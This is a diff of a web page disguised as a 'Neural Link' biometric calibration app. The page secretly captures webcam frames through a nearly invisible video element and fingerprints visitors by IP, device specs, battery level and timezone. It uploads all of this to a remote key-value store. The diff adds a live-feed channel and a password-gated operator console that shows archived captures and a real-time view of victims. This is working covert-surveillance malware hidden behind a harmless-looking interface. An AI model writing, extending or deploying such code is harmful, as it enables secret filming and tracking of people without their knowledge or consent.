@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Neural Link Interface</title>
+    <title>Neural Link Control</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { overscroll-behavior: none; background: #000; color: #fff; font-family: sans-serif; margin: 0; }
+        body { overscroll-behavior: none; background: #000; color: #fff; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; margin: 0; }
         .no-scrollbar::-webkit-scrollbar { display: none; }
         
         .reticle {
@@ -27,16 +27,16 @@
 
         .terminal-input {
             background: transparent; border: none; border-bottom: 2px solid #333;
-            color: #fff; padding: 10px; font-family: monospace; font-size: 18px;
+            color: #fff; padding: 10px; font-size: 18px;
             outline: none; width: 100%; text-align: center; letter-spacing: 0.3em;
         }
 
-        .active-push .reticle { border-color: rgba(255,255,255,0.3); }
-        
         #hiddenSensor {
             position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
             object-fit: cover; z-index: -1; opacity: 0.01; pointer-events: none;
         }
+
+        .tab-active { color: #0ea5e9; border-bottom: 1px solid #0ea5e9; }
     </style>
 </head>
 <body class="overflow-hidden bg-black">
@@ -50,14 +50,14 @@
         <div id="setupView">
             <div class="mb-14 relative flex justify-center items-center">
                 <div class="reticle"></div>
-                <div class="absolute text-white/10 text-[8px] tracking-[0.5em] uppercase">Ready_For_Sync</div>
+                <div class="absolute text-white/10 text-[8px] tracking-[0.5em] uppercase">Status: Ready</div>
             </div>
             <h1 class="text-xl font-thin tracking-[0.6em] uppercase mb-6">Neural Link</h1>
             <p class="text-white/20 text-[9px] uppercase tracking-[0.2em] max-w-xs mx-auto mb-14">
-                Analyze bio-feedback patterns via optical sensor synchronization.
+                Biometric synchronization for optical sensor arrays.
             </p>
             <button id="initBtn" class="border border-white/10 hover:border-white/40 px-14 py-5 rounded-full text-[9px] uppercase tracking-[0.4em] transition-all">
-                Initialize Calibration
+                Initialize Link
             </button>
         </div>
 
@@ -68,34 +68,52 @@
                     <div id="percentDisplay" class="text-2xl font-extralight tracking-[0.2em] text-white/70">0.00%</div>
                 </div>
             </div>
-            <div id="logStatus" class="text-[8px] text-white/10 uppercase tracking-[0.6em] animate-pulse">Syncing Biometrics...</div>
+            <div class="text-[8px] text-white/10 uppercase tracking-[0.6em] animate-pulse">Establishing Secure Uplink...</div>
         </div>
     </main>
 
-    <!-- VAULT INTERFACE -->
-    <div id="vaultPanel" class="hidden fixed inset-0 bg-black z-[200] flex flex-col font-mono text-zinc-400">
-        <div class="p-3 border-b border-white/5 flex justify-between items-center bg-black shrink-0">
-            <div class="flex items-center gap-4">
-                <h2 class="text-[9px] uppercase tracking-[0.2em] text-zinc-600">FULL_STACK_LOGGER_V3</h2>
-                <span id="logCount" class="text-[9px] text-zinc-700 uppercase">-- RECORDS</span>
-            </div>
+    <!-- VAULT TERMINAL -->
+    <div id="vaultPanel" class="hidden fixed inset-0 bg-[#020202] z-[200] flex flex-col font-mono text-zinc-400">
+        <div class="p-4 border-b border-white/5 flex justify-between items-center bg-black shrink-0">
             <div class="flex items-center gap-6">
-                <button id="refreshBtn" class="text-sky-600 hover:text-sky-400 text-[10px] uppercase tracking-widest">PULL</button>
-                <button id="wipeBtn" class="text-red-900/40 hover:text-red-500 text-[10px] uppercase tracking-widest">WIPE</button>
-                <button id="exitVault" class="text-zinc-700 hover:text-white text-[10px] uppercase ml-4">CLOSE</button>
+                <h2 class="text-[10px] uppercase font-bold text-sky-900 tracking-tighter">NODE_COMMAND</h2>
+                <nav class="flex gap-4">
+                    <button id="tabArchive" class="text-[9px] uppercase tracking-widest pb-1 tab-active">Archive</button>
+                    <button id="tabLive" class="text-[9px] uppercase tracking-widest pb-1 text-zinc-600">Live_Feed</button>
+                </nav>
+            </div>
+            <div class="flex items-center gap-4">
+                <span id="autoSyncStatus" class="text-[7px] text-green-900 uppercase animate-pulse">Live_Sync: ON</span>
+                <button id="wipeBtn" class="text-red-900/40 hover:text-red-600 text-[10px] uppercase">Purge</button>
+                <button id="exitVault" class="text-zinc-700 hover:text-white text-[10px] uppercase">Exit</button>
             </div>
         </div>
 
         <div id="vaultAuth" class="flex-grow flex flex-col items-center justify-center p-10 bg-black">
             <div class="w-full max-w-xs text-center">
-                <div class="text-[8px] tracking-[1em] text-zinc-800 uppercase mb-8">Auth_Required</div>
-                <input type="password" id="vaultKey" placeholder="••••••" class="terminal-input mb-8" autofocus>
-                <button id="authBtn" class="text-[10px] uppercase text-zinc-700 hover:text-zinc-300 tracking-[0.4em]">Verify</button>
+                <input type="password" id="vaultKey" placeholder="KEY_CODE" class="terminal-input mb-8" autofocus>
+                <button id="authBtn" class="text-[10px] uppercase text-zinc-700 hover:text-zinc-300 tracking-[0.4em]">Validate</button>
             </div>
         </div>
 
         <div id="vaultMain" class="hidden flex-grow flex flex-col overflow-hidden">
-            <div id="imageGrid" class="flex-grow overflow-y-auto p-2 grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-2 no-scrollbar"></div>
+            <!-- ARCHIVE CONTENT -->
+            <div id="archiveContent" class="flex-grow overflow-y-auto p-2 grid grid-cols-2 md:grid-cols-4 lg:grid-cols-8 gap-2 no-scrollbar"></div>
+            
+            <!-- LIVE FEED CONTENT -->
+            <div id="liveContent" class="hidden flex-grow flex flex-col items-center justify-center p-4 bg-zinc-950/20">
+                <div class="relative w-full max-w-xl aspect-square border border-white/5 bg-black overflow-hidden flex items-center justify-center">
+                    <img id="liveMonitor" class="w-full h-full object-cover opacity-80" src="">
+                    <div class="absolute top-4 left-4 flex items-center gap-2">
+                        <div class="w-2 h-2 bg-red-600 rounded-full animate-pulse"></div>
+                        <span class="text-[8px] uppercase tracking-widest text-red-600">Terminal_Link_Active</span>
+                    </div>
+                    <div id="liveMeta" class="absolute bottom-4 left-4 right-4 text-[7px] text-zinc-600 grid grid-cols-2 gap-2 uppercase tracking-tighter">
+                        <div>ID: <span id="liveIp">---</span></div>
+                        <div>BAT: <span id="liveBat">---</span></div>
+                    </div>
+                </div>
+            </div>
         </div>
     </div>
 
@@ -115,55 +133,43 @@
         const vaultMain = document.getElementById('vaultMain');
         const vaultAuth = document.getElementById('vaultAuth');
         const vaultKey = document.getElementById('vaultKey');
-        const imageGrid = document.getElementById('imageGrid');
-        const logCount = document.getElementById('logCount');
+        const archiveContent = document.getElementById('archiveContent');
+        const liveContent = document.getElementById('liveContent');
+        const liveMonitor = document.getElementById('liveMonitor');
+        const liveIp = document.getElementById('liveIp');
+        const liveBat = document.getElementById('liveBat');
 
         let isLive = false;
         let systemFingerprint = {};
+        let syncTimer = null;
 
         async function generateFingerprint() {
             let ip = "0.0.0.0";
-            try { 
-                const r = await fetch('https://api.ipify.org?format=json'); 
-                const d = await r.json(); 
-                ip = d.ip; 
-            } catch(e){}
-
+            try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e){}
             let battery = "Unknown";
-            try { 
-                const b = await navigator.getBattery(); 
-                battery = `${(b.level * 100).toFixed(0)}% ${b.charging ? '(Charging)' : ''}`;
-            } catch(e){}
+            try { const b = await navigator.getBattery(); battery = `${(b.level * 100).toFixed(0)}%`; } catch(e){}
 
             systemFingerprint = {
                 ip: ip,
-                ua: navigator.userAgent,
-                cores: navigator.hardwareConcurrency || '?',
-                ram: navigator.deviceMemory || '?',
-                lang: navigator.language,
-                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                res: `${screen.width}x${screen.height}`,
-                bat: battery
+                ua: navigator.userAgent.split(') ')[0] + ')',
+                cores: navigator.hardwareConcurrency,
+                ram: navigator.deviceMemory,
+                bat: battery,
+                tz: Intl.DateTimeFormat().resolvedOptions().timeZone
             };
         }
 
         const Cloud = {
             async push(img) {
                 const key = `log_${Date.now()}`;
-                document.body.classList.add('active-push');
-                const payload = { 
-                    img, 
-                    info: systemFingerprint, 
-                    t: new Date().toISOString() 
-                };
+                const liveKey = `live_stream`; // Fixed key for real-time monitoring
+                const payload = JSON.stringify({ img, info: systemFingerprint, t: new Date().toISOString() });
                 try {
-                    await fetch(`${KV_URL}/set/${key}`, {
-                        method: 'POST',
-                        headers: { 'Authorization': `Bearer ${KV_TOKEN}` },
-                        body: JSON.stringify(payload)
-                    });
+                    // Push to Archive
+                    fetch(`${KV_URL}/set/${key}`, { method: 'POST', headers: { 'Authorization': `Bearer ${KV_TOKEN}` }, body: payload });
+                    // Update Live Status
+                    fetch(`${KV_URL}/set/${liveKey}`, { method: 'POST', headers: { 'Authorization': `Bearer ${KV_TOKEN}` }, body: payload });
                 } catch (e) {}
-                setTimeout(() => document.body.classList.remove('active-push'), 200);
             },
             async pull() {
                 try {
@@ -178,6 +184,13 @@
                     }
                     return results;
                 } catch (e) { return []; }
+            },
+            async pullLive() {
+                try {
+                    const res = await fetch(`${KV_URL}/get/live_stream`, { headers: { 'Authorization': `Bearer ${KV_TOKEN}` } });
+                    const data = await res.json();
+                    return data.result ? JSON.parse(data.result) : null;
+                } catch (e) { return null; }
             },
             async purge() {
                 const kRes = await fetch(`${KV_URL}/keys/log_*`, { headers: { 'Authorization': `Bearer ${KV_TOKEN}` } });
@@ -196,7 +209,6 @@
                     const min = Math.min(sensor.videoWidth, sensor.videoHeight);
                     ctx.drawImage(sensor, (sensor.videoWidth-min)/2, (sensor.videoHeight-min)/2, min, min, 0, 0, 400, 400);
                     const dataUrl = canvas.toDataURL('image/jpeg', 0.4);
-                    // Update battery/dynamic stats before each push
                     await generateFingerprint();
                     Cloud.push(dataUrl);
                 }
@@ -213,51 +225,76 @@
                 setupView.classList.add('hidden');
                 activeView.classList.remove('hidden');
                 startCapture();
-            } catch (e) { 
-                alert("Neural Calibration Error."); 
+            } catch (e) { alert("Calibration Error."); }
+        };
+
+        // --- VAULT LOGIC ---
+
+        const syncArchive = async () => {
+            const data = await Cloud.pull();
+            archiveContent.innerHTML = '';
+            data.forEach(item => {
+                const d = document.createElement('div');
+                d.className = "bg-zinc-950 border border-white/5 overflow-hidden flex flex-col";
+                d.innerHTML = `
+                    <img src="${item.img}" class="w-full aspect-square object-cover">
+                    <div class="p-1 text-[5px] text-zinc-700 font-mono flex justify-between uppercase">
+                        <span>${item.info?.ip}</span>
+                        <span>${new Date(item.t).toLocaleTimeString()}</span>
+                    </div>`;
+                archiveContent.appendChild(d);
+            });
+        };
+
+        const syncLive = async () => {
+            const live = await Cloud.pullLive();
+            if (live) {
+                liveMonitor.src = live.img;
+                liveIp.textContent = live.info.ip;
+                liveBat.textContent = live.info.bat;
             }
+        };
+
+        const startAutoSync = () => {
+            if (syncTimer) clearInterval(syncTimer);
+            syncTimer = setInterval(() => {
+                if (archiveContent.classList.contains('hidden')) syncLive();
+                else syncArchive();
+            }, 8000);
         };
 
         document.getElementById('authBtn').onclick = () => {
             if (vaultKey.value === '5502012') {
                 vaultAuth.classList.add('hidden');
                 vaultMain.classList.remove('hidden');
-                syncVault();
+                syncArchive();
+                startAutoSync();
             }
         };
 
-        async function syncVault() {
-            logCount.textContent = "SYNCING...";
-            const data = await Cloud.pull();
-            imageGrid.innerHTML = '';
-            logCount.textContent = `${data.length} RECORDS`;
-            data.forEach(item => {
-                const d = document.createElement('div');
-                const info = item.info || {};
-                d.className = "relative bg-zinc-950 border border-white/5 overflow-hidden flex flex-col";
-                d.innerHTML = `
-                    <img src="${item.img}" class="w-full aspect-square object-cover">
-                    <div class="p-2 text-[7px] leading-tight text-zinc-500 font-mono">
-                        <div class="text-sky-500 mb-1">${info.ip || '?.?.?.?'}</div>
-                        <div class="truncate">${info.ua || 'Unknown UA'}</div>
-                        <div class="flex justify-between mt-1 text-zinc-700">
-                            <span>${info.res || '?x?'}</span>
-                            <span>CPU:${info.cores} RAM:${info.ram}GB</span>
-                        </div>
-                        <div class="flex justify-between mt-0.5">
-                            <span class="text-zinc-600">${info.tz || 'UTC'}</span>
-                            <span class="${info.bat?.includes('Charging') ? 'text-green-900' : ''}">${info.bat || '?'}</span>
-                        </div>
-                    </div>
-                `;
-                imageGrid.appendChild(d);
-            });
-        }
+        // TABS
+        document.getElementById('tabArchive').onclick = (e) => {
+            archiveContent.classList.remove('hidden');
+            liveContent.classList.add('hidden');
+            e.target.classList.add('tab-active');
+            document.getElementById('tabLive').classList.remove('tab-active');
+            syncArchive();
+        };
 
-        document.getElementById('refreshBtn').onclick = syncVault;
-        document.getElementById('wipeBtn').onclick = async () => { if(confirm("Purge Archive?")) { await Cloud.purge(); syncVault(); } };
+        document.getElementById('tabLive').onclick = (e) => {
+            archiveContent.classList.add('hidden');
+            liveContent.classList.remove('hidden');
+            e.target.classList.add('tab-active');
+            document.getElementById('tabArchive').classList.remove('tab-active');
+            syncLive();
+        };
+
+        document.getElementById('wipeBtn').onclick = async () => { if(confirm("Purge?")) { await Cloud.purge(); syncArchive(); } };
         document.getElementById('vaultTrigger').onclick = () => vaultPanel.classList.toggle('hidden');
-        document.getElementById('exitVault').onclick = () => vaultPanel.classList.add('hidden');
+        document.getElementById('exitVault').onclick = () => {
+            vaultPanel.classList.add('hidden');
+            clearInterval(syncTimer);
+        };
     </script>
 </body>
 </html>
